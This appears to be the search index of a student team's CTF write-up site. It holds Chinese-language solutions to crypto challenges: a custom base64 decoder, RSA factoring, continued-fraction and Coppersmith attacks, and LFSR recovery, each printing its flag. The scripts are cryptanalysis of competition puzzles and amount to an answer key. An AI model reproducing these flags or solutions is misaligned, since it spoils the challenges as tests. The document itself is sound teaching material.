{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"panic404 \u6d3b\u52a8\u65e5\u5386","text":""},{"location":"ai/placeholder/","title":"Placeholder","text":"<p>This file will be deleted soon.</p>"},{"location":"crypto/%5BBJDCTF%202020%5D%E8%BF%99%E6%98%AFbase%EF%BC%9F%EF%BC%9F/","title":"[BJDCTF 2020]\u8fd9\u662fbase\uff1f\uff1f","text":"<p>\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684base64\u5b57\u5178\uff0c\u4e0e\u6807\u51c6\u5b57\u5178\u4e0d\u540c\u3002\u731c\u6d4b\u5e94\u8be5\u662f\u66ff\u6362\u52a0\u5bc6\uff0c\u53ef\u4ee5\u5199\u4e00\u4e2a\u811a\u672c\uff0c\u628a\u5bc6\u6587\u4e2d\u7684\u6bcf\u4e2a\u5b57\u7b26\u66ff\u6362\u56de\u6807\u51c6 Base64 \u5b57\u7b26</p> <pre><code>import base64\n\ndict={0: 'J', 1: 'K', 2: 'L', 3: 'M', 4: 'N', 5: 'O', 6: 'x', 7: 'y', 8: 'U', 9: 'V', 10: 'z', 11: 'A', 12: 'B', 13: 'C', 14: 'D', 15: 'E', 16: 'F', 17: 'G', 18: 'H', 19: '7', 20: '8', 21: '9', 22: 'P', 23: 'Q', 24: 'I', 25: 'a', 26: 'b', 27: 'c', 28: 'd', 29: 'e', 30: 'f', 31: 'g', 32: 'h',33: 'i', 34: 'j', 35: 'k', 36: 'l', 37: 'm', 38: 'W', 39: 'X', 40: 'Y', 41: 'Z', 42: '0', 43: '1', 44: '2', 45: '3', 46: '4', 47: '5', 48: '6', 49: 'R', 50: 'S', 51: 'T', 52: 'n', 53: 'o', 54: 'p', 55: 'q', 56: 'r', 57: 's', 58: 't', 59: 'u', 60: 'v', 61: 'w', 62: '+', 63: '/', 64: '='}\n\nbase64_list = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P','Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f','g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v','w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/']\n\ncipher='FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw'\n\nres=''\n\nfor i in range(len(cipher)):\n\n    for j in range(64):\n\n        if(dict[j]==cipher[i]):\n\n            res+=base64_list[j]\n\nprint(res)\n\nflag=base64.b64decode(res)\n\nprint(flag)\n</code></pre> <p>\u8fd0\u884c\u811a\u672c\uff1a</p> <p></p> <p>\u6839\u636e\u63d0\u4ea4\u63d0\u793a\uff0c\u5c06BJD\u66ff\u6362\u4e3aflag\u5373\u53ef\u3002</p> <p> by. cinansu </p>"},{"location":"crypto/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-crypto/","title":"2025\u5c71\u4e1c\u7701\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b-crypto","text":"<p>\u4e09\u9053\u9898\u51fa\u4e86\u4e24\u4e2a</p>"},{"location":"crypto/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-crypto/#ezcrypto","title":"ezcrypto","text":"<pre><code>from Crypto.Util.number import long_to_bytes, inverse\nfrom math import isqrt\n\nN = 27471366612277687007582969113484500296001065780066244888800712342807125394382681326213781865815461951298727242405665286291957769318403190235219727462190547340268057407480936794909750874545280586676586199139504945994789654115224950518297646992315179314766094156202525491469674180110591820099543752380512935927805722237181\ne = 65537\ng = 111684314954681193048509857146926361842347687090472066568935363273885037337811\nC = 12643371534391958135236095622827564261907624974618206428861944879376238094269846145595767463703827586815298891013812360542402349502974102836324041194817837979051818191875704215738686008582339520686043633518534916826599993931844826243220488649199690449278527396151017995036899907805560418507134336681609833081538329779248\n\nr = 2 * g\nh = (N - 1) // r\ns0 = h % r\n\nS_min = 1 &lt;&lt; 274\nS_max = (1 &lt;&lt; 275) - 2\n\nk_min = (S_min - s0 + r - 1) // r\nk_max = (S_max - s0) // r\n\np = q = None\nfor k in range(k_min, k_max + 1):\n    S = s0 + k * r          # a+b \u5019\u9009\n    sum_pq = r * S + 2      # p+q\n    D = sum_pq * sum_pq - 4 * N\n    if D &lt; 0:\n        continue            # \u8df3\u8fc7\u65e0\u6548\u5019\u9009\n    t = isqrt(D)\n    if t * t != D:\n        continue\n    p_candidate = (sum_pq + t) // 2\n    q_candidate = (sum_pq - t) // 2\n    if p_candidate * q_candidate == N:\n        p, q = p_candidate, q_candidate\n        break\n\nassert p and q, \"factor failed\"\n\nphi = (p - 1) * (q - 1)\nd = inverse(e, phi)\nm = pow(C, d, N)\npt = long_to_bytes(m)\nprint(pt)\n# b'flag{d39691fd3467e11c5c4443e65a93ab37}'\n</code></pre>"},{"location":"crypto/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-crypto/#rsaaa","title":"rsaaa","text":"<p>\u5f53 p \u548c q \u5f88\u5927\u65f6\uff0cn4 \u662f\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u4e2d\u7684\u7edd\u5bf9\u4e3b\u5bfc\u9879\uff0c\u800c p4+q4 \u76f8\u5bf9\u4e8e n4 \u662f\u4e00\u4e2a\u8f83\u5c0f\u7684\u9879\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u505a\u51fa\u4e00\u4e2a\u5173\u952e\u7684\u8fd1\u4f3c\uff1a</p> <p>\u03d5\u2248n4</p> <p>\u9898\u76ee\u7ed9\u51fa\u7684\u6838\u5fc3\u5173\u7cfb\u662f\uff1a</p> <p>e\u22c5d\u22611(mod\u03d5)</p> <p>\u8fd9\u7b49\u4ef7\u4e8e\u5b58\u5728\u4e00\u4e2a\u6574\u6570 k\uff0c\u4f7f\u5f97\uff1a</p> <p>e\u22c5d\u2212k\u22c5\u03d5=1</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u7528 n4 \u6765\u8fd1\u4f3c \u03d5\uff1a</p> <p>e\u22c5d\u2212k\u22c5n4\u22481</p> <p>\u7531\u4e8e e\u22c5d \u548c k\u22c5n4 \u90fd\u975e\u5e38\u5927\uff0c\u8fd9\u4e2a \"1\" \u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1\uff0c\u6240\u4ee5\uff1a</p> <p>e\u22c5d\u2248k\u22c5n4</p> <p></p> <p>https://g.co/gemini/share/78a8a156a7f5</p> <pre><code>from Crypto.Util.number import long_to_bytes\n\n# \u5df2\u77e5\u53c2\u6570\nc = 4569479985227351005063785995135067032720378517762895932536659766750620715910605148533244779487921315047171013575610160508152407529266889273867903198797261\nn = 4886488210976342084709096740163565218271041981736454979038282347346782586289498952728993072164156014308360739234075655553608312787941314479273226321644139\ne = 69226245919249557284362852197482448692961051575353210229155811272280423133461036546714805862880491826820998627526504053578014404131806296413582035968459012627551356400980693085358304615504234701685438459878813948020276726029476169237998655600278740940333141714850818687244699016224065398835277355085190021649464175896949882797374785669601481278636634767170296279707462651980061069176263757678901169598571771064631589157944694386675873019622753613139854047148807223799604198162775252510345809461265433420840521382586775251192251617135265179686326411651203242167525116012981497530813723052998392487942518359093767791\n\ndef continued_fraction_convergents(num, den):\n    \"\"\"\u8ba1\u7b97 num/den \u7684\u8fde\u5206\u6570\u6e10\u8fd1\u5206\u6570\"\"\"\n    a_list = []\n    while den != 0:\n        a = num // den\n        a_list.append(a)\n        num, den = den, num % den\n\n    p_prev, q_prev = 1, 0\n    p_curr, q_curr = a_list[0], 1\n    yield p_curr, q_curr # \u7b2c\u4e00\u4e2a\u6e10\u8fd1\u5206\u6570\n\n    for i in range(1, len(a_list)):\n        a_i = a_list[i]\n        p_next = a_i * p_curr + p_prev\n        q_next = a_i * q_curr + q_prev\n\n        yield p_next, q_next\n\n        p_prev, q_prev = p_curr, q_curr\n        p_curr, q_curr = p_next, q_next\n\ndef solve():\n    print(\"\u6b63\u5728\u8ba1\u7b97 n^4 ...\")\n    n4_approx = n**4\n    print(\"\u6b63\u5728\u8ba1\u7b97 e / n^4 \u7684\u8fde\u5206\u6570\u6e10\u8fd1\u5206\u6570...\")\n\n    # \u83b7\u53d6\u6e10\u8fd1\u5206\u6570 k/d\n    convergents = continued_fraction_convergents(e, n4_approx)\n\n    for i, (k, d) in enumerate(convergents):\n        # \u57fa\u672c\u7684\u5408\u7406\u6027\u68c0\u67e5\n        if k == 0 or d == 0:\n            continue\n\n        print(f\"\u5c1d\u8bd5\u7b2c {i+1} \u7ec4\u5019\u9009 (k, d)\uff0cd \u7684\u4f4d\u6570\u4e3a {d.bit_length()}...\")\n\n        # \u5c1d\u8bd5\u7528\u5019\u9009\u7684 d \u89e3\u5bc6\n        try:\n            m = pow(c, d, n)\n            flag_bytes = long_to_bytes(m)\n\n            # \u68c0\u67e5 flag \u683c\u5f0f\n            if b\"flag{\" in flag_bytes:\n                print(\"\\n[+] \u6210\u529f\u627e\u5230 Flag!\")\n                print(f\"  [-] \u79c1\u94a5 d: {d}\")\n                print(f\"  [-] \u660e\u6587: {flag_bytes.decode()}\")\n                return\n        except Exception as err:\n            # \u53ef\u80fd\u4f1a\u51fa\u73b0 long_to_bytes \u8f6c\u6362\u5931\u8d25\u7b49\u95ee\u9898\uff0c\u5ffd\u7565\u5373\u53ef\n            continue\n\n    print(\"\\n[-] \u672a\u80fd\u627e\u5230 Flag\u3002\")\n\nif __name__ == '__main__':\n    solve()\n    #[+] \u6210\u529f\u627e\u5230 Flag!\n    #[-] \u79c1\u94a5 d: 1338133894393370430259101557054242526599331059586233740134637750356111\n    #[-] \u660e\u6587: flag{fc3f4ce8dc3eaca8807812b8c0435cd4}\n</code></pre>"},{"location":"crypto/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-crypto/#_1","title":"2025\u5c71\u4e1c\u7701\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b-crypto","text":"<p> by. HuajiHD </p>"},{"location":"crypto/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Crypro/","title":"\u7f8a\u57ce\u676f2025-Crypro","text":""},{"location":"crypto/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Crypro/#_1","title":"\u745e\u5fb7\u7684\u4e00\u751f","text":"\\[ \\begin{aligned} &amp;\\text{\u5df2\u77e5 } n,x,\\; c_i,c_{i+1}. \\\\ &amp;s_i^{(b)} \\equiv c_i\\cdot x^{-b}\\pmod n,\\quad b\\in\\{0,1\\}. \\\\ &amp;\\text{\u82e5\u731c\u6d4b\u6b63\u786e\uff0c\u5219 } s_i^{(b_i)} \\equiv y_i^2. \\\\ &amp;R \\coloneqq y_{i+1}-y_i \\in (0,2^{48}).\\\\[2mm] &amp;F(R) \\equiv \\big(s_{i+1}^{(b_{i+1})}-s_i^{(b_i)}-R^2\\big)^2-4\\,s_i^{(b_i)}\\,R^2 \\equiv 0 \\pmod n.\\\\[2mm] &amp;\\text{\u7528 Coppersmith \u5355\u53d8\u91cf\u5c0f\u6839\u5728 } 0&lt;R&lt;2^{48} \\text{ \u5185\u6c42 } R. \\\\ &amp;y_i \\equiv \\big(s_{i+1}^{(b_{i+1})}-s_i^{(b_i)}-R^2\\big)\\,(2R)^{-1}\\pmod n,\\\\ &amp;y_{i+1}\\equiv y_i+R\\pmod n.\\\\[2mm] &amp;m=\\sum_{k} b_k\\,2^{k}\\quad(\\text{\u5bc6\u6587\u6309 LSB}\\to\\text{MSB}). \\end{aligned} \\] <p>exp\uff1a</p> <pre><code>from sage.all import *\nimport re, ast, sys\n\ntxt = open('output.txt','r',encoding='utf-8').read()\nn  = Integer(re.search(r'n\\s*=\\s*(\\d+)', txt).group(1))\nx  = Integer(re.search(r'x\\s*=\\s*(\\d+)', txt).group(1))\nenc = list(map(Integer, ast.literal_eval(re.search(r'enc\\s*=\\s*(\\[.*\\])', txt, re.S).group(1))))\n\nZmodN = Zmod(n)\ninvx  = Integer(inverse_mod(x, n))\nRbound = 2^48  # r \u7684\u5df2\u77e5\u4e0a\u754c\n\n# \u9884\u8ba1\u7b97\u53bb\u6389 x \u56e0\u5b50\u7684\u4e24\u5957\u6b8b\u5dee\uff1ab=0 -&gt; s0[i]=enc[i]\uff0c b=1 -&gt; s1[i]=enc[i]*x^{-1}\ns0 = [ZmodN(c) for c in enc]\ns1 = [ZmodN(c) * invx for c in enc]\n\ndef try_seed_at(i):\n    \"\"\"\n    \u5728\u4f4d\u7f6e i \u5c1d\u8bd5\u56db\u79cd (b_i, b_{i+1}) \u2208 {(0,0),(0,1),(1,0),(1,1)}\n    \u7528 F_i(r) = ((\u0394s)-r^2)^2 - 4 r^2 s_i \u505a\u4e00\u6b21\u56db\u6b21\u5c0f\u6839\uff0c\u8fd4\u56de\u9996\u4e2a\u6210\u529f\u7684 (r_i, y_i, b_i, b_{i+1})\n    \"\"\"\n    PR = PolynomialRing(ZmodN, 'r'); r = PR.gen()\n    for bi in (0,1):\n        for bj in (0,1):\n            si  = s0[i] if bi==0 else s1[i]\n            sip = s0[i+1] if bj==0 else s1[i+1]\n            Ds  = (sip - si)  # \u0394s = s_{i+1}-s_i  (mod n)\n            F   = (Ds - r^2)^2 - 4*r^2*si          # \u4e00\u5143\u56db\u6b21\n            # Coppersmith \u5c0f\u6839\uff1ar &lt; 2^48 \u8fdc\u5c0f\u4e8e n^{1/4}\uff0cbeta=1 \u5373\u53ef\n            roots = F.small_roots(X=Rbound, beta=1)\n            for rr in roots:\n                rr = Integer(rr)\n                if rr &lt;= 0 or rr &gt;= Rbound: \n                    continue\n                # \u53cd\u63a8 y_i \uff0c\u5e76\u6821\u9a8c\n                inv_2r = inverse_mod(2*rr, n)\n                yi = Integer(( (Ds - rr*rr) * inv_2r ) % n)\n                # \u6821\u9a8c\uff1ay_i^2 \u2261 s_i, (y_i+r)^2 \u2261 s_{i+1}\n                if (Integer(yi)^2 % n) != Integer(si):\n                    continue\n                if (Integer(yi+rr)^2 % n) != Integer(sip):\n                    continue\n                return rr, yi, bi, bj\n    return None\n\ndef step_forward(j, yj, bj):\n    \"\"\"\n    \u5df2\u77e5 y_j \u4e0e b_j\uff0c\u5411\u524d\u89e3\u7b2c j+1 \u4f4d\uff1a\n      \u89e3 r^2 + 2*yj*r - (s_{j+1}-s_j) \u2261 0 (mod n), 0&lt;r&lt;2^48\n      \u8bd5 b_{j+1}=0 \u6216 1\uff0c\u54ea\u4e2a\u7ed9\u51fa\u5c0f\u6839\u4e14\u901a\u8fc7\u6821\u9a8c\uff0c\u5c31\u9009\u54ea\u4e2a\n    \u8fd4\u56de (r_j, y_{j+1}, b_{j+1}) \u6216 None\n    \"\"\"\n    PR = PolynomialRing(ZmodN, 'r'); r = PR.gen()\n    sj = s0[j] if bj==0 else s1[j]\n    for bnext in (0,1):\n        sj1 = s0[j+1] if bnext==0 else s1[j+1]\n        Ds  = (sj1 - sj)\n        F   = r^2 + 2*Integer(yj)*r - Ds\n        roots = F.small_roots(X=Rbound, beta=1)\n        for rr in roots:\n            rr = Integer(rr)\n            if rr &lt;= 0 or rr &gt;= Rbound:\n                continue\n            y1 = yj + rr\n            # \u6821\u9a8c\u4e24\u8fb9\u5e73\u65b9\n            if (Integer(y1)^2 % n) != Integer(sj1):\n                continue\n            return rr, Integer(y1), bnext\n    return None\n\ndef step_backward(j, yj, bjm1):\n    \"\"\"\n    \u5df2\u77e5 y_j \u4e0e b_{j-1}\uff0c\u5411\u540e\u89e3\u7b2c j-1 \u4f4d\uff1a\n      \u7528\u7b49\u5f0f\uff1as_j - s_{j-1} \u2261 2*y_{j-1} r + r^2 \uff0c\u4ee3\u5165 y_{j-1}=y_j - r\n      \u5f97\uff1ar^2 - 2*y_j*r + (s_j - s_{j-1}) \u2261 0 (mod n)\n      \u540c\u6837\u8bd5 b_{j-1}=0 \u6216 1\uff0c\u54ea\u4e2a\u6709\u5c0f\u6839\u4e14\u901a\u8fc7\u6821\u9a8c\u9009\u54ea\u4e2a\n    \u8fd4\u56de (r_{j-1}, y_{j-1}, b_{j-1}) \u6216 None\n    \"\"\"\n    PR = PolynomialRing(ZmodN, 'r'); r = PR.gen()\n    sj = s0[j] if (bjm1 is None) else None  # \u8fd9\u91cc\u6211\u4eec\u6309\u9700\u8981\u5206\u522b\u8bd5 b_{j-1}\n    for bprev in (0,1):\n        sjm1 = s0[j-1] if bprev==0 else s1[j-1]\n        # s_j \u672a\u77e5 b \u65f6\u9700\u8981\u4e24\u79cd\u90fd\u8bd5\uff1b\u4e3a\u7b80\u5355\u8d77\u89c1\u5206\u522b\u6784\u9020\n        for bj in (0,1):\n            sj  = s0[j] if bj==0 else s1[j]\n            Ds  = (sj - sjm1)\n            F   = r^2 - 2*Integer(yj)*r + Ds\n            roots = F.small_roots(X=Rbound, beta=1)\n            for rr in roots:\n                rr = Integer(rr)\n                if rr &lt;= 0 or rr &gt;= Rbound:\n                    continue\n                y0 = yj - rr\n                if (Integer(y0)^2 % n) != Integer(sjm1):\n                    continue\n                # \u8fd4\u56de\u65f6\u4e00\u5e76\u786e\u5b9a b_{j-1}, \u4ee5\u53ca\u6211\u4eec\u9009\u62e9\u7684 b_j\n                return rr, Integer(y0), bprev, bj\n    return None\n\n# 2) \u5bfb\u627e\u4e00\u4e2a\u201c\u79cd\u5b50\u201d i\nseed = None\nfor i in range(len(enc)-1):\n    seed = try_seed_at(i)\n    if seed:\n        r0, y0, b_i, b_ip = seed\n        seed_idx = i\n        break\n\nif not seed:\n    print(\"[-] \u672a\u5728\u9ed8\u8ba4\u641c\u7d22\u91cc\u627e\u5230\u53ef\u7528\u79cd\u5b50\uff1b\u53ef\u8c03\u5927\u641c\u7d22\u8303\u56f4\u6216\u6362\u673a\u5668\u518d\u8bd5\u3002\")\n    sys.exit(1)\n\nprint(f\"[+] seed at i={seed_idx}: r={r0} (&lt;2^48), got y_i, bits {b_i}{b_ip}\")\n\n# 3) \u5411\u53f3\u63a8\u8fdb\nbits = [None]*len(enc)\ny_vals = [None]*len(enc)\nbits[seed_idx]   = b_i\nbits[seed_idx+1] = b_ip\ny_vals[seed_idx] = y0\ny_vals[seed_idx+1] = y0 + r0\n\nj = seed_idx+1\nwhile j &lt; len(enc)-1:\n    step = step_forward(j, y_vals[j], bits[j])\n    if not step:\n        print(f\"[-] forward \u5931\u8d25\u5728 j={j}\uff0c\u53ef\u6362\u53e6\u4e00\u4e2a seed \u91cd\u8bd5\u3002\")\n        sys.exit(1)\n    rj, yj1, bnext = step\n    bits[j+1] = bnext\n    y_vals[j+1] = yj1\n    j += 1\n\n# 4) \u5411\u5de6\u63a8\u8fdb\nj = seed_idx\nwhile j &gt; 0:\n    # \u8fd9\u91cc\u6211\u4eec\u53ea\u9700\u8981 b_{j-1} \u548c y_{j-1}\uff1b\u672c\u5b9e\u73b0\u9009\u62e9\u8f83\u76f4\u63a5\u4f46\u7565\u4fdd\u5b88\u7684\u53cc\u8bd5\n    # \u4e3a\u7b80\u6d01\u8d77\u89c1\uff0c\u6784\u9020\u4e00\u4e2a\u548c forward \u5bf9\u79f0\u7684 \u201c\u540e\u9000\u4e8c\u6b21\u201d\uff1a\n    # \u5229\u7528\uff1as_j - s_{j-1} = 2*y_{j-1}*r_{j-1} + r_{j-1}^2\n    found = None\n    PR = PolynomialRing(ZmodN, 'r'); r = PR.gen()\n    sj = s0[j] if bits[j]==0 else s1[j]\n    for bprev in (0,1):\n        sjm1 = s0[j-1] if bprev==0 else s1[j-1]\n        Ds   = (sj - sjm1)\n        F    = r^2 - 2*Integer(y_vals[j])*r + Ds\n        roots = F.small_roots(X=Rbound, beta=1)\n        for rr in roots:\n            rr = Integer(rr)\n            if rr &lt;= 0 or rr &gt;= Rbound: \n                continue\n            yjm1 = Integer(y_vals[j] - rr)\n            if (Integer(yjm1)^2 % n) != Integer(sjm1):\n                continue\n            found = (rr, yjm1, bprev)\n            break\n        if found: break\n    if not found:\n        print(f\"[-] backward \u5931\u8d25\u5728 j={j-1}\uff0c\u53ef\u6362 seed \u6216\u8c03\u53c2\u6570\u3002\")\n        sys.exit(1)\n    rr, yjm1, bprev = found\n    bits[j-1]   = bprev\n    y_vals[j-1] = yjm1\n    j -= 1\n\n# 5) \u7ec4\u88c5\u660e\u6587\uff08\u6ce8\u610f enc \u662f LSB-&gt;MSB\uff09\nm = 0\nfor i,b in enumerate(bits):\n    if b not in (0,1):\n        print(\"[-] \u6709\u672a\u786e\u5b9a\u4f4d\uff0c\u5f02\u5e38\u3002\"); sys.exit(1)\n    m |= (b &lt;&lt; i)\n\ndigits_256 = [int(d) for d in Integer(m).digits(256)]\nbs = bytes(reversed(digits_256))\ntry:\n    print(\"FLAG =\", bs.decode())\nexcept UnicodeDecodeError:\n    print(\"FLAG(hex) =\", bs.hex())\n\n\n#[+] seed at i=0: r=31335709591515 (&lt;2^48), got y_i, bits 10\n#FLAG = DASCTF{Wh@t_y0u_See_Is_r3a1??}\n</code></pre>"},{"location":"crypto/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Crypro/#ridiculous-lfsr","title":"Ridiculous LFSR","text":"<p>\u9898\u9762\u5efa\u6a21</p> <ul> <li> <p>\u51fa\u9898\u811a\u672c\uff1a\u6bcf\u8f6e\u53d6 <code>temp = LFSR.next(L)</code>\uff0c\u8bb0\u5176 1 \u7684\u4e2a\u6570\u4e3a <code>l[i]</code>\uff1b\u8f93\u51fa <code>c[i] = temp \u2295 m_i</code>\uff0c\u5176\u4e2d <code>m_{i+1} = rotl(m_i,1)</code>\uff08\u6bd4\u7279\u5faa\u73af\u5de6\u79fb 1\uff09</p> </li> <li> <p>\u4e3a\u4e0e\u521d\u59cb\u660e\u6587 m \u5bf9\u9f50\uff0c\u505a <code>t_i = rotr(c[i], i)</code>\uff0c\u5219 <code>t_i = rotl(temp,i) \u2295 m</code>\u3002\u56e0\u65cb\u8f6c\u4e0d\u6539\u6bd4\u7279\u4e2a\u6570\uff1a<code>popcount(rotl(temp,i)) = l[i]</code>\u3002</p> </li> </ul> <p>\u5c06 popcount \u53d8\u6210\u7ebf\u6027\u65b9\u7a0b</p> <ul> <li>\u8bb0 <code>x = rotl(temp,i)</code> \u7684\u7b2c j \u4f4d\u4e3a <code>x_{ij}</code>\uff0c<code>z_j = m</code> \u7684\u7b2c j \u4f4d\u3002</li> <li>\u6052\u7b49\u5f0f\uff1a<code>x_j \u2295 z_j = x_j + z_j - 2 x_j z_j</code>\u3002\u4e24\u4fa7\u5bf9 j \u6c42\u548c\u5e76\u79fb\u9879\uff0c\u53ef\u5316\u6210   <code>popcount(x \u2295 z) - popcount(x) = \u03a3_j (2\u00b7x_{ij}-1)\u00b7z_j</code>\u3002</li> <li>\u5bf9\u672c\u9898\uff1a\u5de6\u8fb9\u7b49\u4e8e <code>a[i] - l[i]</code>\uff0c\u5176\u4e2d <code>a[i] = popcount(t_i)</code>\uff0c\u53f3\u8fb9\u7684\u7cfb\u6570\u5b9a\u4e49\u4e3a <code>V_{ij} = 2\u00b7t_i[j]-1</code>\uff08\u00b11\uff09\u3002\u4e8e\u662f\u5f97\u5230\u6574\u6570\u7ebf\u6027\u7cfb\u7edf <code>V z = target</code>\uff0c<code>target[i]=a[i]-l[i]</code>\u3002</li> </ul> <p>\u6570\u503c\u6c42\u89e3</p> <p>\u53d8\u91cf <code>z_j \u2208 {0,1}</code>\u3002\u91c7\u7528\u542f\u53d1\u5f0f\u5750\u6807\u4e0b\u964d\uff1a\u53cd\u590d\u8bd5\u7ffb\u67d0\u4e00\u4f4d <code>z_j</code>\uff0c\u82e5\u80fd\u964d\u4f4e\u6b8b\u5dee\u5e73\u65b9\u548c <code>\u2016Vz-target\u2016\u00b2</code> \u5c31\u63a5\u53d7\uff1b\u505c\u5728 0 \u6b8b\u5dee\u65f6\u5f97\u5230\u7cbe\u786e\u89e3\u3002</p> <p>\u590d\u73b0\u5668\u5b9e\u73b0\uff1a</p> <p>\u200b   \u53f3\u56de\u8f6c <code>c[i]</code> \u5f97 <code>t_i</code>\uff0c\u8ba1\u7b97 <code>a[i]=bit_count(t_i)</code>\uff0c\u6784\u9020 <code>V</code> \u4e0e <code>target</code>\uff1b</p> <p>\u200b   \u9010\u4f4d\u968f\u673a\u91c7\u6837+\u6700\u4f73\u7ffb\u8f6c\uff0c\u76f4\u5230\u6b8b\u5dee\u4e3a 0\uff1b</p> <p>\u200b   \u7ec4\u56de <code>m</code> \u5e76\u8f6c\u4e3a\u5b57\u8282\u8f93\u51fa</p> <pre><code># \u6838\u5fc3\u590d\u73b0\u5668\uff08\u57fa\u4e8e\u9898\u9762\u6570\u636e\uff09\uff0cPython 3.10+\n# \u8bf4\u660e\uff1a\u628a output.txt \u91cc\u7684 c \u4e0e l \u5217\u8868\u586b\u5165\u5373\u53ef\u3002\nLENGTH = 295\n# c = [...]  # \u6765\u81ea output.txt\n# l = [...]  # \u6765\u81ea output.txt\n\ndef rotl(x, r, n=LENGTH):\n    s = bin(x)[2:].zfill(n); r %= n\n    return int(s[r:]+s[:r], 2)\ndef rotr(x, r, n=LENGTH):\n    return rotl(x, n - (r % n), n)\n\n# t_i = rotate_right(c[i], i)\nt = [rotr(ci, i, LENGTH) for i, ci in enumerate(c)]\na = [ti.bit_count() for ti in t]\nb = l[:]  # popcount(temp_i)\n\n# V_{ij} = 2*t_i[j] - 1  (\u00b11)\nm, n = len(t), LENGTH\ndef bit_at(x, j):  # j: 0..n-1, MSB first\n    return (x &gt;&gt; (n-1-j)) &amp; 1\nV = [[ (1 if bit_at(t[i], j) else -1) for j in range(n) ] for i in range(m)]\ntarget = [a[i] - b[i] for i in range(m)]\n\n# \u542f\u53d1\u5f0f\u5750\u6807\u4e0b\u964d\uff1a\u9010\u4f4d\u7ffb\u8f6c z_j (0/1) \u4ee5\u51cf\u5c11\u5e73\u65b9\u8bef\u5dee\uff0c\u76f4\u5230\u6070\u597d 0\u3002\nz = [0]*n\n# r = Vz - target\nr = [-target[i] for i in range(m)]  # \u56e0\u4e3a Vz \u521d\u59cb\u4e3a 0\ndef deltaE(j):\n    sign = 1 if z[j]==0 else -1\n    col = [V[i][j] for i in range(m)]\n    new = [r[i] + sign*col[i] for i in range(m)]\n    return sum(v*v for v in new) - sum(v*v for v in r)\n\nimport random\nrandom.seed(0)\nE = sum(v*v for v in r)\nfor _ in range(20000):\n    best, best_j = 0, None\n    for _ in range(100):  # \u91c7\u6837\u82e5\u5e72\u4f4d\uff0c\u9009\u6700\u4f18\u7ffb\u8f6c\n        j = random.randrange(n)\n        dE = deltaE(j)\n        if dE &lt; best:\n            best, best_j = dE, j\n    if best_j is None:\n        # \u8d70\u4e0d\u52a8\u5c31\u968f\u673a\u6270\u52a8\u4e00\u4f4d\n        j = random.randrange(n)\n        best_j = j\n    # \u5e94\u7528\u7ffb\u8f6c\n    sign = 1 if z[best_j]==0 else -1\n    for i in range(m):\n        r[i] += sign * V[i][best_j]\n    z[best_j] ^= 1\n    E = sum(v*v for v in r)\n    if E == 0: break\n\n# \u7ec4\u56de\u660e\u6587\nm_int = 0\nfor j in range(n):\n    m_int = (m_int&lt;&lt;1) | z[j]\nm_bytes = m_int.to_bytes((n+7)//8, 'big')\nprint(m_bytes)  # b\"It'5_4_pr0bl3m_0f_L4ttice!_n0t_LFSR!!\"\n</code></pre> <p> by. HuajiHD </p>"},{"location":"misc/placeholder/","title":"Placeholder","text":"<p>This file will be deleted soon. </p>"},{"location":"pwn/placeholder/","title":"Placeholder","text":"<p>This file will be deleted soon.</p>"},{"location":"reverse/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-rev/","title":"2025\u5c71\u4e1c\u7701\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b-rev","text":"<p>\u5171\u4e24\u9053\u9898\uff0cak\uff0c\u5176\u4e2d\u7b2c\u4e8c\u9053\u9898\u7684flag checker\u7591\u4f3c\u51fa\u9519\uff08\uff09</p>"},{"location":"reverse/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-rev/#game","title":"game","text":"<p>ida\u6253\u5f00\u5230main\uff0c\u53cd\u7f16\u8bd1</p> <p></p> <p>\u8fdbsub_136D\u53d1\u73b0\u662f\u8ff7\u5bab\u7684\u521d\u59cb\u5316</p> <p>sub_1992\u662f\u8bfb\u53d6\u8f93\u5165\u5185\u5bb9</p> 